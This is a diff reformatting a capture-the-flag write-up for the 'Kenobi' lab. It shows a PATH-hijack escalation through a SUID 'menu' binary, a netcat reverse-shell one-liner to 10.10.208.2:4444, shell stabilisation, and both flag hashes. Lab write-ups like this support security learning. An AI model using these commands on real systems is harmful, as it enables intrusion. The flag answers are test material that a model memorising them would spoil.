@@ -173,9 +173,10 @@
 		-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
 		'''
 
-**Flag Found**
-	/home/kenobi/user.txt: <d0b0f3f53b6caa532a83915e19224899>
-
+*Flag Found*<details>
+	<summary>Spoiler</summary>
+		/home/kenobi/user.txt: d0b0f3f53b6caa532a83915e19224899
+</details>
 
 # PrivEsc #
 
@@ -184,78 +185,77 @@
 
 - find / -type f -user root -perm -u=s 2>/dev/null
 
-'''
-/sbin/mount.nfs
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/snapd/snap-confine
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/bin/chfn
-/usr/bin/newgidmap
-/usr/bin/pkexec
-/usr/bin/passwd
-/usr/bin/newuidmap
-/usr/bin/gpasswd
-/usr/bin/menu
-/usr/bin/sudo
-/usr/bin/chsh
-/usr/bin/newgrp
-/bin/umount
-/bin/fusermount
-/bin/mount
-/bin/ping
-/bin/su
-/bin/ping6
-'''
+		'''
+		/sbin/mount.nfs
+		/usr/lib/policykit-1/polkit-agent-helper-1
+		/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+		/usr/lib/snapd/snap-confine
+		/usr/lib/eject/dmcrypt-get-device
+		/usr/lib/openssh/ssh-keysign
+		/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+		/usr/bin/chfn
+		/usr/bin/newgidmap
+		/usr/bin/pkexec
+		/usr/bin/passwd
+		/usr/bin/newuidmap
+		/usr/bin/gpasswd
+		/usr/bin/menu
+		/usr/bin/sudo
+		/usr/bin/chsh
+		/usr/bin/newgrp
+		/bin/umount
+		/bin/fusermount
+		/bin/mount
+		/bin/ping
+		/bin/su
+		/bin/ping6
+		'''
 
-//What the heck is /usr/bin/menu
-
+	> What the heck is /usr/bin/menu
 
 - /usr/bin/menu
 
-'''
-1. status check
-2. kernel version
-3. ifconfig
-** Enter your choice :
-'''
+		'''
+		1. status check
+		2. kernel version
+		3. ifconfig
+		** Enter your choice :
+		'''
 
 - strings /usr/bin/menu
 
-'''
-1. status check
-2. kernel version
-3. ifconfig
-** Enter your choice :
-curl -I localhost
-uname -r
-ifconfig
- Invalid choice
-'''
+		'''
+		1. status check
+		2. kernel version
+		3. ifconfig
+		** Enter your choice :
+		curl -I localhost
+		uname -r
+		ifconfig
+		 Invalid choice
+		'''
 
-//running curl, uname, and ifconfig as root
+	> running curl, uname, and ifconfig as root
 
 
 -----------------------
 	Exploiting PATH
 -----------------------
 
-- cd /tmp
-- echo /bin/sh > curl
-- chmod 777 curl
-- export PATH=/tmp:$PATH
-- /usr/bin/menu
+	- cd /tmp
+	- echo /bin/sh > curl
+	- chmod 777 curl
+	- export PATH=/tmp:$PATH
+	- /usr/bin/menu
 
-'''
-1. status check
-2. kernel version
-3. ifconfig
-** Enter your choice :1
-- id
-uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
-'''
+	'''
+	1. status check
+	2. kernel version
+	3. ifconfig
+	** Enter your choice :1
+	# id
+	uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+	'''
 
 - root gained
 
@@ -264,44 +264,40 @@ uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(di
 	Better Shell
 --------------------
 
----Attacker---
+### Attacker ###
 
-- msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.208.2 LPORT=4444
+- $ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.208.2 LPORT=4444
 	> mkfifo /tmp/ksgcn; nc 10.10.208.2 4444 0</tmp/ksgcn | /bin/sh >/tmp/ksgcn 2>&1; rm /tmp/ksgcn
 
----Target---
+### Target ###
 
-- run payload
+run payload
 
----Stabalisation---
+### Stabalisation ###
 
-'''
-- python -c 'import pty;pty.spawn("/bin/bash")'
-- CTRL Z
-- stty raw -echo
-- fg
-- export TERM=xterm
-'''
+	- # python -c 'import pty;pty.spawn("/bin/bash")'
+	- CTRL Z
+	- $ stty raw -echo
+	- $ fg
+	- # export TERM=xterm
+	
+ \# cd /root
+ 
+ 
+ \# ls -la
 
-- cd /root
-- ls -la
-
-'''
-drwx------  3 root root 4096 Sep  4  2019 .
-drwxr-xr-x 23 root root 4096 Sep  4  2019 ..
-lrwxrwxrwx  1 root root    9 Sep  4  2019 .bash_history -> /dev/null
--rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-drwx------  2 root root 4096 Sep  4  2019 .cache
--rw-r--r--  1 root root  148 Aug 17  2015 .profile
--rw-r--r--  1 root root   33 Sep  4  2019 root.txt
--rw-------  1 root root 5383 Sep  4  2019 .viminfo
-'''
-
-**Flag Found**
-	/root/root.txt: <177b3cd8562289f37382721c28381f02>
-
-# Cleanup #
-
-- rm /var/tmp/id_rsa
-- rm /tmp/curl
-- export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+		'''
+		drwx------  3 root root 4096 Sep  4  2019 .
+		drwxr-xr-x 23 root root 4096 Sep  4  2019 ..
+		lrwxrwxrwx  1 root root    9 Sep  4  2019 .bash_history -> /dev/null
+		-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+		drwx------  2 root root 4096 Sep  4  2019 .cache
+		-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+		-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
+		-rw-------  1 root root 5383 Sep  4  2019 .viminfo
+		'''
+		
+*Flag Found*<details>
+	<summary>Spoiler</summary>
+		/root/root.txt: 177b3cd8562289f37382721c28381f02
+</details>
